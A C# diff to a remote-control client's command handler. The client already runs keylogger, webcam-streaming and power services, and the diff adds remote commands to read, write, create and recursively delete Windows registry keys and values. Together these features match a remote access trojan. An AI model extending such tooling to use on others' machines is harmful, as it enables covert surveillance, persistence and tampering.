@@ -15,6 +15,7 @@ public class CommandHandler
     private readonly KeyLoggerService _keyLoggerService;
     private readonly WebCamService _webCamService;
     private readonly PowerService _powerService;
+    private readonly RegistryService _registryService;
 
     // ====== Webcam Streaming Callbacks (set by SignalRClientService) ======
     private Action? _onStartWebcam;
@@ -34,6 +35,7 @@ public class CommandHandler
         _keyLoggerService = KeyLoggerService.Instance;
         _webCamService = new WebCamService();
         _powerService = new PowerService();
+        _registryService = new RegistryService();
     }
 
     // ====== Main Handler ======
@@ -73,6 +75,16 @@ public class CommandHandler
                 CommandType.Restart => HandleRestart(request),
                 CommandType.Sleep => HandleSleep(request),
                 CommandType.Lock => HandleLock(request),
+
+                // ===== Registry =====
+                CommandType.ReadRegistry => HandleReadRegistry(request),
+                CommandType.WriteRegistry => HandleWriteRegistry(request),
+                CommandType.CreateRegistryKey => HandleCreateRegistryKey(request),
+                CommandType.DeleteRegistryKey => HandleDeleteRegistryKey(request),
+                CommandType.DeleteRegistryValue => HandleDeleteRegistryValue(request),
+                CommandType.ListRegistrySubKeys => HandleListRegistrySubKeys(request),
+                CommandType.ListRegistryValues => HandleListRegistryValues(request),
+                CommandType.GetRegistryKeyInfo => HandleGetRegistryKeyInfo(request),
 
                 // ===== Unknown =====
                 _ => HandleUnknownCommand(request)
@@ -184,6 +196,120 @@ public class CommandHandler
     {
        var (success, message) = _powerService.Lock();
        return success ? CreateSuccessResult(request, message) : CreateErrorResult(request, message);
+    }
+
+    // ====== Registry Handlers ======
+    private CommandResult HandleReadRegistry(CommandRequest request)
+    {
+        var keyPath = request.RegistryKeyPath;
+        var valueName = request.RegistryValueName ?? string.Empty;
+
+        if (string.IsNullOrEmpty(keyPath))
+            return CreateErrorResult(request, "Missing KeyPath parameter");
+
+        var result = _registryService.ReadValue(keyPath, valueName);
+        var success = !result.OperationMessage.StartsWith("Lỗi");
+        return success 
+            ? CreateSuccessResult(request, result.OperationMessage, result)
+            : CreateErrorResult(request, result.OperationMessage);
+    }
+
+    private CommandResult HandleWriteRegistry(CommandRequest request)
+    {
+        var keyPath = request.RegistryKeyPath;
+        var valueName = request.RegistryValueName ?? string.Empty;
+        var value = request.RegistryValue ?? string.Empty;
+        var valueType = request.RegistryValueType;
+
+        if (string.IsNullOrEmpty(keyPath))
+            return CreateErrorResult(request, "Missing KeyPath parameter");
+
+        var result = _registryService.WriteValue(keyPath, valueName, value, valueType);
+        var success = !result.OperationMessage.StartsWith("Lỗi");
+        return success 
+            ? CreateSuccessResult(request, result.OperationMessage, result)
+            : CreateErrorResult(request, result.OperationMessage);
+    }
+
+    private CommandResult HandleCreateRegistryKey(CommandRequest request)
+    {
+        var keyPath = request.RegistryKeyPath;
+
+        if (string.IsNullOrEmpty(keyPath))
+            return CreateErrorResult(request, "Missing KeyPath parameter");
+
+        var result = _registryService.CreateKey(keyPath);
+        var success = !result.OperationMessage.StartsWith("Lỗi");
+        return success 
+            ? CreateSuccessResult(request, result.OperationMessage, result)
+            : CreateErrorResult(request, result.OperationMessage);
+    }
+
+    private CommandResult HandleDeleteRegistryKey(CommandRequest request)
+    {
+        var keyPath = request.RegistryKeyPath;
+
+        if (string.IsNullOrEmpty(keyPath))
+            return CreateErrorResult(request, "Missing KeyPath parameter");
+
+        // Check if recursive delete is requested
+        var recursive = request.Parameters.TryGetValue("Recursive", out var r) && r.ToLower() == "true";
+
+        var result = _registryService.DeleteKey(keyPath, recursive);
+        var success = !result.OperationMessage.StartsWith("Lỗi");
+        return success 
+            ? CreateSuccessResult(request, result.OperationMessage, result)
+            : CreateErrorResult(request, result.OperationMessage);
+    }
+
+    private CommandResult HandleDeleteRegistryValue(CommandRequest request)
+    {
+        var keyPath = request.RegistryKeyPath;
+        var valueName = request.RegistryValueName ?? string.Empty;
+
+        if (string.IsNullOrEmpty(keyPath))
+            return CreateErrorResult(request, "Missing KeyPath parameter");
+
+        var result = _registryService.DeleteValue(keyPath, valueName);
+        var success = !result.OperationMessage.StartsWith("Lỗi");
+        return success 
+            ? CreateSuccessResult(request, result.OperationMessage, result)
+            : CreateErrorResult(request, result.OperationMessage);
+    }
+
+    private CommandResult HandleListRegistrySubKeys(CommandRequest request)
+    {
+        var keyPath = request.RegistryKeyPath;
+
+        if (string.IsNullOrEmpty(keyPath))
+            return CreateErrorResult(request, "Missing KeyPath parameter");
+
+        var result = _registryService.ListSubKeys(keyPath);
+        return CreateSuccessResult(request, $"Found {result.SubKeys.Count} subkeys", result);
+    }
+
+    private CommandResult HandleListRegistryValues(CommandRequest request)
+    {
+        var keyPath = request.RegistryKeyPath;
+
+        if (string.IsNullOrEmpty(keyPath))
+            return CreateErrorResult(request, "Missing KeyPath parameter");
+
+        var result = _registryService.ListValues(keyPath);
+        return CreateSuccessResult(request, $"Found {result.Values.Count} values", result);
+    }
+
+    private CommandResult HandleGetRegistryKeyInfo(CommandRequest request)
+    {
+        var keyPath = request.RegistryKeyPath;
+
+        if (string.IsNullOrEmpty(keyPath))
+            return CreateErrorResult(request, "Missing KeyPath parameter");
+
+        var result = _registryService.GetKeyInfo(keyPath);
+        return result.Exists
+            ? CreateSuccessResult(request, $"Key exists: {result.SubKeyCount} subkeys, {result.ValueCount} values", result)
+            : CreateErrorResult(request, $"Key does not exist: {keyPath}");
     }
 
     // ====== Unknown Command Handler ======
